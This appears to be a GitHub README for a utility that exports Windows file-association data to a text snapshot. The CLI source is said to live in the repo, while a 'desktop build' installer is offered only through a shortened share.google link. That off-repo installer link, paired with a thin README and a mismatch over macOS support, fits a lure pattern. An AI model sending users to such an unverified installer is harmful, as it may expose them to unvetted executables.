![File Assoc Export](assets/hero.png)

# File Assoc Export

*What opens .md and .csv on this PC.*

## What File Assoc Export is

**File Assoc Export** is a desktop utility. Export file associations for common extensions to a text snapshot.

A 'restore defaults' support step needs a before picture.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Extension list
- ProgId and command
- Text snapshot
- Read-only

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/stevens-5098/file-assoc-export

MIT license. See `LICENSE`.
